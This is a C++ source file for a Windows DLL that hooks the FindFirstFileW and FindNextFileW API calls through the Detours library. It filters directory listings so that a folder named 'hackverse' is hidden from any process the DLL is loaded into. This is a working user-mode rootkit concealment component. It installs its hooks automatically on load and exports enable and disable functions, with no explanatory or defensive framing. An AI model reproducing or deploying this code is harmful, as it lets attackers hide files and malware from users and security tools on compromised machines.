#define _WIN32_WINNT 0x0600 
#include <windows.h>
#include <detours.h>
#include <string>
#include <iostream>

#define HIDE_FOLDER L"hackverse"


typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);


static FindFirstFileW_t Real_FindFirstFileW = nullptr;
static FindNextFileW_t  Real_FindNextFileW  = nullptr;

HANDLE WINAPI My_FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
    HANDLE hFind = Real_FindFirstFileW(lpFileName, lpFindFileData);
    if (hFind == INVALID_HANDLE_VALUE) return hFind;

    WIN32_FIND_DATAW tempData;
    while (_wcsicmp(lpFindFileData->cFileName, HIDE_FOLDER) == 0) {
        if (!Real_FindNextFileW(hFind, &tempData)) {
            return INVALID_HANDLE_VALUE;
        }
        *lpFindFileData = tempData;
    }

    return hFind;
}

BOOL WINAPI My_FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
    WIN32_FIND_DATAW tempData;
    while (Real_FindNextFileW(hFindFile, &tempData)) {
        if (_wcsicmp(tempData.cFileName, HIDE_FOLDER) != 0) {
            *lpFindFileData = tempData;
            return TRUE;
        }
    }
    return FALSE;
}

void InstallHooks() {
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    Real_FindFirstFileW = (FindFirstFileW_t)GetProcAddress(hKernel, "FindFirstFileW");
    Real_FindNextFileW  = (FindNextFileW_t)GetProcAddress(hKernel, "FindNextFileW");

    DetourAttach((PVOID*)&Real_FindFirstFileW, My_FindFirstFileW);
    DetourAttach((PVOID*)&Real_FindNextFileW, My_FindNextFileW);

    DetourTransactionCommit();
}

void RemoveHooks() {
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach((PVOID*)&Real_FindFirstFileW, My_FindFirstFileW);
    DetourDetach((PVOID*)&Real_FindNextFileW, My_FindNextFileW);
    DetourTransactionCommit();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        std::wcout << L"========================================\n";
        std::wcout << L" Hook Active!\n";
        std::wcout << L" Folder '" << HIDE_FOLDER << L"' will be hidden\n";
        std::wcout << L"========================================\n";
        InstallHooks();
    }
    else if (fdwReason == DLL_PROCESS_DETACH) {
        RemoveHooks();
    }
    return TRUE;
}


extern "C" __declspec(dllexport) void CALLBACK EnableHooks() { InstallHooks(); }
extern "C" __declspec(dllexport) void CALLBACK DisableHooks() { RemoveHooks(); }
